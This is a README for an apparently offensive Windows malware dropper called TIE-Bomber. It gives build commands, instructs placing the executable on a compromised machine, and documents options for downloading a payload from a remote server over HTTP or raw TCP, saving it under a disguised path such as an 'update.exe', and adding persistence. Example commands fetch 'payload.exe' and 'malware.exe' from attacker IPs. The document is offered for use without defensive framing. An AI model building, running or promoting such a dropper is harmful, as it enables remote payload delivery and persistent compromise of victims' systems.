# TIE-Bomber Dropper

![img](TIE-Bombers.gif)

## Build
- Install ```mingw-64```
```
sudo apt update && sudo apt install mingw-w64
```
- Compile
```
x86_64-w64-mingw32-gcc -o TIE-Bomber.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -lws2_32 -lurlmon -lwininet -lshlwapi TIE-Bomber.c
```
## Usage
> Place the TIE-Bomber.exe to the compromised Windows machine

```
TIE-Bomber.exe -i <IP> -e <EXE> [options]
```

## Required arguments

* `-i <IP>`
  IP address of the server to download the payload from.

* `-e <EXE>`
  Name of the executable to download (e.g., payload.exe).

## Optional arguments

* `-t <TARGET PATH>`
  Full path where the payload should be saved.
  If omitted, name will not be changed.

* `-p <PORT>`
  Port number to connect to (default: 80).

* `-s`
  Use raw TCP sockets instead of HTTP or other protocols.

* `-P`
  Enable persistence only (no download or connect).
  Note: when using `-P`, the `-t` option (target path) is required.

* `-h`
  Print this help message.

## Examples

```
dropper.exe -i 192.168.1.100 -e payload.exe -t C:\Users\Public\drop.exe
dropper.exe -i 10.0.0.2 -e malware.exe -p 9001 -s
dropper.exe -P -t C:\Windows\Temp\update.exe
```

---

# Contributions are highly welcomed!
